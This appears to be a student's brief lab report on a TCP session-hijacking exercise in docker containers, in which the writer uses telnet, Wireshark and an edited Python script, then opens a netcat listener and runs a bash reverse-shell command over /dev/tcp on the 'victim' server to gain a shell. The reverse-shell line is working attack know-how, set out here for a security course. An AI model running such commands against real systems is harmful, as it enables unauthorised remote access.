This is same as Q3's actions.
First of all i ran docker-compose up,
   i run command "telnet 10.9.0.7" and checked it with wireshark.
as shown above screenshots. I changed python code with server ip(10.9.0.5) and ran it.
and then I executed command "nc -lnv 9090 , /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1" on victim server "10.9.0.5"
so i could result as shown above screenshots and created shell on server.
